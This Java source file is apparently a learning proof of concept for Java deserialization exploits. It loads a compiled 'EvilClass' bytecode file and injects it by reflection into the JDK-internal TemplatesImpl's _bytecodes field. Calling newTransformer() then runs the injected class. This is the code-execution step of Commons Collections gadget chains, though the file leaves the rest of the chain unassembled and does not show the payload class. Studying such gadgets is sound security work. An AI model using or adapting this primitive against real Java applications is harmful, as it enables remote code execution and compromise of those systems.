package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC5_TrAXFilter {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();

        //读取 EvilClass.class 文件
        byte[] evilBytes = Files.readAllBytes(Paths.get( System.getProperty("user.dir")+"\\commons-collections\\CommonsCollections2/src/main/java/EvilClass.class"));
        // 反射设置字段
        setFieldValue(templates, "_name", "EvilClass");
        setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.newTransformer();
    }
}
